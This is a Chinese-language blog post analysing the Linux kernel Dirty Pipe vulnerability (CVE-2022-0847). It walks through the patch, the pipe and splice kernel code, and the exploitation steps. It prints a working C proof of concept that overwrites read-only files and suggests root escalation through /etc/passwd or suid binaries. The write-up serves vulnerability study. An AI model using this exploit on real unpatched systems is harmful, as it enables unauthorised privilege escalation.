<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>CVE-2022-0847 Dirty Pipe | kotori的菜园</title>
<link rel="shortcut icon" href="https://kotoriseed.github.io//favicon.ico?v=1718591155332">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://kotoriseed.github.io//styles/main.css">
<link rel="alternate" type="application/atom+xml" title="CVE-2022-0847 Dirty Pipe | kotori的菜园 - Atom Feed" href="https://kotoriseed.github.io//atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">


<script async src="https://www.googletagmanager.com/gtag/js?id=G-PJDEM99E9P"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-PJDEM99E9P');
</script>


    <meta name="description" content="漏洞简介
Description
A flaw was found in the way the &quot;flags&quot; member of the new pipe buffer structure was lacking p..." />
    <meta name="keywords" content="CVE" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://kotoriseed.github.io/">
  <img class="avatar" src="https://kotoriseed.github.io//images/avatar.png?v=1718591155332" alt="">
  </a>
  <h1 class="site-title">
    kotori的菜园
  </h1>
  <p class="site-description">
    挑战者贵为永恒黄金
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          首页
        </a>
      
    
      
        <a href="/archives" class="menu">
          归档
        </a>
      
    
      
        <a href="/tags" class="menu">
          标签
        </a>
      
    
      
        <a href="/post/friends" class="menu">
          友链
        </a>
      
    
      
        <a href="/post/about" class="menu">
          关于
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              CVE-2022-0847 Dirty Pipe
            </h2>
            <div class="post-info">
              <span>
                2023-05-25
              </span>
              <span>
                11 min read
              </span>
              
                <a href="https://kotoriseed.github.io/tag/b5l9Cu9ID/" class="post-tag">
                  # CVE
                </a>
              
            </div>
            
            <div class="post-content-wrapper">
              <div class="post-content" v-pre>
                <h1 id="漏洞简介">漏洞简介</h1>
<h2 id="description">Description</h2>
<p>A flaw was found in the way the &quot;flags&quot; member of the new pipe buffer structure was lacking proper initialization in<code> copy_page_to_iter_pipe</code> and push_pipe functions in the Linux kernel and could thus contain stale values. An unprivileged local user could use this flaw to write to pages in the page cache backed by read only files and as such escalate their privileges on the system.</p>
<p>简单的来说就是由于没有对<code>pipe_buffer-&gt;flags</code>字段进行初始化，最后导致了越权写入。类似于&quot;dirty cow&quot;漏洞，但该漏洞的利用条件更为简单。</p>
<pre><code>漏洞编号: CVE-2022-0847
适用版本: 该漏洞影响从5.8开始的大部分主流版本，直到5.16.11, 5.15.25, 5.10.102才被修复。
漏洞评分: CVSS Version 3.x: 7.8(HIGH)
		CVSS Version 2.0: 7.2(HIGH)
漏洞危害: 本地提权，对任意文件（至少具有读权限）写入不超过一张内存页的数据。
</code></pre>
<h2 id="patch">Patch</h2>
<p>参考<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9d2231c5d74e13b2a0546fee6737ee4446017903">这个commit</a></p>
<pre><code class="language-bash">diff --git a/lib/iov_iter.c b/lib/iov_iter.c
index b0e0acdf96c15..6dd5330f7a995 100644
--- a/lib/iov_iter.c
+++ b/lib/iov_iter.c
@@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by
 		return 0;
 
 	buf-&gt;ops = &amp;page_cache_pipe_buf_ops;
+	buf-&gt;flags = 0;
 	get_page(page);
 	buf-&gt;page = page;
 	buf-&gt;offset = offset;
@@ -577,6 +578,7 @@ static size_t push_pipe(struct iov_iter *i, size_t size,
 			break;
 
 		buf-&gt;ops = &amp;default_pipe_buf_ops;
+		buf-&gt;flags = 0;
 		buf-&gt;page = page;
 		buf-&gt;offset = 0;
 		buf-&gt;len = min_t(ssize_t, left, PAGE_SIZE);
</code></pre>
<h1 id="漏洞分析">漏洞分析</h1>
<p>笔者复现时使用的内核是<code>linux-5.16.10</code>，文件系统是<code>busybox-1.3.2</code>编译的。以下操作和源码皆基于此版本。</p>
<h2 id="pipe相关">pipe相关</h2>
<p>管道是IPC的一个重要实现手段，其本体是一个<code>pipe_inode_info</code>结构体，</p>
<pre><code class="language-c">struct pipe_inode_info {
	struct mutex mutex; // 全局互斥体
	wait_queue_head_t rd_wait; // 空管道中reader的等待点
    wait_queue_head_t wr_wait; // 满管道中writer的等待点
	unsigned int head; // 缓冲区生产点(The point of buffer production)
	unsigned int tail; // 缓冲区消费点(The point of buffer consumption)
	unsigned int max_usage; // 环上可使用的slot的最大数量
	unsigned int ring_size; // 缓冲区的总数(必须是2的次方)
#ifdef CONFIG_WATCH_QUEUE
	bool note_loss; // The next read() should insert a data-lost message
#endif
	unsigned int nr_accounted; // 此管道在user-&gt;pipe_bufs中占的数量
	unsigned int readers; // 当前管道reader的数量
	unsigned int writers; // 当前管道writer的数量
	unsigned int files; // 该管道被struct file引用的数量(protected by -&gt;i_lock)
	unsigned int r_counter; // reader计数器
	unsigned int w_counter; // writer计数器
	unsigned int poll_usage; // is this pipe used for epoll, which has crazy wakeups?
	struct page *tmp_page; // cached released page
	struct fasync_struct *fasync_readers; // 读端fasync
	struct fasync_struct *fasync_writers; // 写端fasync
	struct pipe_buffer *bufs; // pipe_buffer的循环队列
	struct user_struct *user; // 创建该管道的用户
#ifdef CONFIG_WATCH_QUEUE
	struct watch_queue *watch_queue; // stuff for watch_queue
#endif
};
</code></pre>
<p>通过对该结构维护的缓冲区进行读写即可完成进程间的读写通信。</p>
<p><code>pipe_buffer</code>的结构如下：</p>
<pre><code class="language-c">struct pipe_buffer {
	struct page *page; // 缓冲区所在的内存页
	unsigned int offset, len; // 缓冲区在对应内存页中的偏移和长度
	const struct pipe_buf_operations *ops; //pipe_buffer结构的vtable(pipe_buf_operations)
	unsigned int flags; // 标志位
	unsigned long private; // private data owned by the ops
};
</code></pre>
<p>在使用<code>pipe()</code>创建管道时，<code>pipe_buffer</code>的ops被赋值为<code>pipefifo_fops</code>，</p>
<pre><code class="language-c">const struct file_operations pipefifo_fops = {
	.open		= fifo_open,
	.llseek		= no_llseek,
	.read_iter	= pipe_read,
	.write_iter	= pipe_write,
	.poll		= pipe_poll,
	.unlocked_ioctl	= pipe_ioctl,
	.release	= pipe_release,
	.fasync		= pipe_fasync,
	.splice_write	= iter_file_splice_write,
};
</code></pre>
<h3 id="pipe_write">pipe_write</h3>
<p>将数据写入bufs中，在管道非空时，会尝试将新内容合并到队列的最后一个buffer中（需要目标buffer设置了<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志位）。若该buffer写满之后还有剩余数据，则将新buffer入队，然后继续写入（此时可能会开辟新的物理页，且新buffer若未指定<code>O_DIRECT</code>选项就会标记上<code>PIPE_BUF_FLAG_CAN_MERGE</code>）。若管道满了，会做一些等待，被重新唤醒之后检查是否符合条件并尝试继续写入数据。</p>
<h3 id="pipe_read">pipe_read</h3>
<p>从bufs中读出数据，若管道已满，只有在开始读取后才会唤醒writer进行写入（使用<code>WF_SYNC</code>同步唤醒）。逐buffer读出数据，如果读完了则让对应buffer出队。</p>
<h2 id="splice调用">splice调用</h2>
<p>原型:</p>
<pre><code class="language-c">ssize_t splice(int fd_in, loff_t *off_in, int fd_out,
               loff_t *off_out, size_t len, unsigned int flags);
/* @fd_in: 目标文件
 * @off_in: 从指定的文件偏移处开始读取
 * @fd_out: 指代一个pipe
 * @len: 要传输的数据长度
 * @flags: 标志位
 */
</code></pre>
<p>该系统调用将pipe的缓存页用作文件之间数据的缓存页，实现跨文件的数据拷贝，避免了频繁的内核和用户间数据拷贝。</p>
<p>有以下调用链：<code>splice</code> -&gt; <code>__do_splice</code> -&gt; <code>do_splice</code></p>
<pre><code class="language-c">long do_splice(struct file *in, loff_t *off_in, struct file *out,
	       loff_t *off_out, size_t len, unsigned int flags)
{
	struct pipe_inode_info *ipipe;
	struct pipe_inode_info *opipe;
	loff_t offset;
	long ret;

	if (unlikely(!(in-&gt;f_mode &amp; FMODE_READ) ||
		     !(out-&gt;f_mode &amp; FMODE_WRITE)))
		return -EBADF;

	ipipe = get_pipe_info(in, true);
	opipe = get_pipe_info(out, true);

	if (ipipe &amp;&amp; opipe) {
		if (off_in || off_out)
			return -ESPIPE;

		/* Splicing to self would be fun, but... */
		if (ipipe == opipe)
			return -EINVAL;

		if ((in-&gt;f_flags | out-&gt;f_flags) &amp; O_NONBLOCK)
			flags |= SPLICE_F_NONBLOCK;

		return splice_pipe_to_pipe(ipipe, opipe, len, flags);
	}

	if (ipipe) {
		if (off_in)
			return -ESPIPE;
		if (off_out) {
			if (!(out-&gt;f_mode &amp; FMODE_PWRITE))
				return -EINVAL;
			offset = *off_out;
		} else {
			offset = out-&gt;f_pos;
		}

		if (unlikely(out-&gt;f_flags &amp; O_APPEND))
			return -EINVAL;

		ret = rw_verify_area(WRITE, out, &amp;offset, len);
		if (unlikely(ret &lt; 0))
			return ret;

		if (in-&gt;f_flags &amp; O_NONBLOCK)
			flags |= SPLICE_F_NONBLOCK;

		file_start_write(out);
		ret = do_splice_from(ipipe, out, &amp;offset, len, flags);
		file_end_write(out);

		if (!off_out)
			out-&gt;f_pos = offset;
		else
			*off_out = offset;

		return ret;
	}

	if (opipe) {
		if (off_out)
			return -ESPIPE;
		if (off_in) {
			if (!(in-&gt;f_mode &amp; FMODE_PREAD))
				return -EINVAL;
			offset = *off_in;
		} else {
			offset = in-&gt;f_pos;
		}

		if (out-&gt;f_flags &amp; O_NONBLOCK)
			flags |= SPLICE_F_NONBLOCK;

		ret = splice_file_to_pipe(in, opipe, &amp;offset, len, flags);
		if (!off_in)
			in-&gt;f_pos = offset;
		else
			*off_in = offset;

		return ret;
	}

	return -EINVAL;
}
</code></pre>
<p>可以看出，该函数对几种不同需求进行了分发处理，</p>
<p>ipipe到opipe: <code>splice_pipe_to_pipe</code></p>
<p>ipipe到文件: <code>do_splice_from</code></p>
<p>文件到opipe: <code>spice_file_to_pipe</code></p>
<h3 id="spice_file_to_pipe">spice_file_to_pipe</h3>
<pre><code class="language-c">long splice_file_to_pipe(struct file *in,
			 struct pipe_inode_info *opipe,
			 loff_t *offset,
			 size_t len, unsigned int flags)
{
	long ret;

	pipe_lock(opipe);
	ret = wait_for_space(opipe, flags);
	if (!ret)
		ret = do_splice_to(in, offset, opipe, len, flags);
	pipe_unlock(opipe);
	if (ret &gt; 0)
		wakeup_pipe_readers(opipe);
	return ret;
}
</code></pre>
<p>该函数会调用<code>do_splice_to</code> -&gt; <code>generic_file_splice_read</code> -&gt; <code>call_read_iter</code> -&gt; <code>ext4_file_read_iter</code> -&gt; <code>generic_file_read_iter</code> -&gt; <code>filemap_read</code> -&gt; <code>filemap_get_pages</code> -&gt; <code>copy_page_to_iter</code> -&gt; <code>__copy_page_to_iter</code> -&gt; <code>copy_page_to_iter_pipe</code></p>
<pre><code class="language-c">static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t bytes,
			 struct iov_iter *i)
{
	struct pipe_inode_info *pipe = i-&gt;pipe;
	struct pipe_buffer *buf;
	unsigned int p_tail = pipe-&gt;tail;
	unsigned int p_mask = pipe-&gt;ring_size - 1;
	unsigned int i_head = i-&gt;head;
	size_t off;

	if (unlikely(bytes &gt; i-&gt;count))
		bytes = i-&gt;count;

	if (unlikely(!bytes))
		return 0;

	if (!sanity(i))
		return 0;

	off = i-&gt;iov_offset;
	buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask]; // 找到pipe bufs队列当前生产点的pipe_buffer
	if (off) {
		if (offset == off &amp;&amp; buf-&gt;page == page) {
			/* merge with the last one */
			buf-&gt;len += bytes;
			i-&gt;iov_offset += bytes;
			goto out;
		}
		i_head++;
		buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];
	}
	if (pipe_full(i_head, p_tail, pipe-&gt;max_usage))
		return 0;

	buf-&gt;ops = &amp;page_cache_pipe_buf_ops;
	get_page(page); // 增加该页框引用计数
	buf-&gt;page = page; // 将pipe buffer的page指针指向该文件的物理页
	buf-&gt;offset = offset;
	buf-&gt;len = bytes;

	pipe-&gt;head = i_head + 1;
	i-&gt;iov_offset = offset + bytes;
	i-&gt;head = i_head;
out:
	i-&gt;count -= bytes;
	return bytes;
}
</code></pre>
<p>该函数直接在pipe的缓冲区队列中建立了一个到目标文件页框的映射，相当于完成了一个从文件读取数据到管道的过程。</p>
<p>值得注意的是在这个函数中并没有对<code>buf-&gt;flags</code>进行初始化，这也是该漏洞的重要成因。</p>
<h2 id="利用手法">利用手法</h2>
<ul>
<li>首先创建一个pipe，利用pipe_write填满缓冲队列，使所有pipe_buffer的flags字段都具有<code>PIPE_BUF_FLAG_CAN_MERGE</code></li>
<li>利用pipe_read清空缓冲队列，使splice调用能直接使用到初始化过flags的buffer，简化利用模型</li>
<li>打开目标文件，使用<code>splice</code>系统调用将对应文件的页框映射到某个pipe_buffer上并写入至少1字节数据，不过要注意的是此时需要预留一定的位置来让下次对该buffer的pipe_read走<code>PIPE_BUF_FLAG_CAN_MERGE</code>这个分支来覆盖掉目标文件的内容。</li>
<li>向管道写入数据，达成利用目标</li>
</ul>
<h3 id="poc">poc</h3>
<pre><code class="language-c">#define _GNU_SOURCE
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/user.h&gt;

#define PAGE_SIZE 4096

int main(int argc, char **argv)
{
	if (argc != 4) {
		printf(&quot;Usage: %s offset target_file data\n&quot;, argv[0]);
		exit(0);
	}
	
	loff_t offset = strtoul(argv[1], NULL, 0);
	
	int fd = open(argv[2], O_RDONLY);
	struct stat fd_stat;
	if (fd == -1) {
		puts(&quot;[-] cannot open target file.&quot;);
		exit(-1);
	}
	fstat(fd, &amp;fd_stat);
	
	const char *const data = argv[3];
	const size_t data_size = strlen(data);
	if (offset &gt; fd_stat.st_size
		|| offset + data_size &gt; fd_stat.st_size
		|| (offset % PAGE_SIZE) + data_size &gt; PAGE_SIZE) {
		puts(&quot;[-] argv wriong.&quot;);
		exit(-1);
	}
	
	int pipe_fd[2];
	pipe(pipe_fd);
	
	int pipe_size = fcntl(pipe_fd[1], F_GETPIPE_SZ);
	char *buffer = (char *) malloc(PAGE_SIZE);
	
	for (unsigned r = pipe_size; r &gt; 0;) {
		unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;
		write(pipe_fd[1], buffer, n);
		r -= n;
	}

	for (unsigned r = pipe_size; r &gt; 0;) {
		unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;
		read(pipe_fd[0], buffer, n);
		r -= n;
	}
	
	--offset; // read 1 bytes in splice()
	splice(fd, &amp;offset, pipe_fd[1], NULL, 1, 0);
	
	if(write(pipe_fd[1], data, data_size) == data_size) {
		puts(&quot;[+] success!&quot;);
	}
	
	return 0;
}
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/05/25/87c8bce3e502c.png" alt="1685016551639.png" loading="lazy"></figure>
<p>成功修改只读文件</p>
<h3 id="提权">提权</h3>
<p>虽然只能读入不超过一张内存页的内容，且目标文件至少需要具有读权限，但实战中仍有大量文件是满足利用条件的。比如说往<code>/etc/passwd</code>中加入一个root权限的用户，或者劫持具有suid权限的程序来执行提权code。</p>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a>
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#patch">Patch</a></li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a>
<ul>
<li><a href="#pipe%E7%9B%B8%E5%85%B3">pipe相关</a>
<ul>
<li><a href="#pipe_write">pipe_write</a></li>
<li><a href="#pipe_read">pipe_read</a></li>
</ul>
</li>
<li><a href="#splice%E8%B0%83%E7%94%A8">splice调用</a>
<ul>
<li><a href="#spice_file_to_pipe">spice_file_to_pipe</a></li>
</ul>
</li>
<li><a href="#%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95">利用手法</a>
<ul>
<li><a href="#poc">poc</a></li>
<li><a href="#%E6%8F%90%E6%9D%83">提权</a></li>
</ul>
</li>
</ul>
</li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">下一篇</div>
            <a href="https://kotoriseed.github.io/post/pokemon-red/">
              <h3 class="post-title">
                游戏安全初探: 从Pokemon火红开始
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  
  <a class="rss" href="https://kotoriseed.github.io//atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
